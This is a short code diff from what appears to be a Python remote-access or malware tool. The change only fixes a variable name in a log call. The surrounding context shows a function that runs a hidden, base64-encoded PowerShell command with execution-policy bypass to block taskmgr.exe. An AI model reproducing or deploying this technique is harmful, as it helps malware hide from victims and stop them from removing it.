@@ -166,4 +166,4 @@ def block(process_name='taskmgr.exe'):
         _ = os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
         return "Process {} blocked".format(process_name)
     except Exception as e:
-        util.log("{} error: {}".format(blocker.func_name, str(e)))
+        util.log("{} error: {}".format(block.func_name, str(e)))
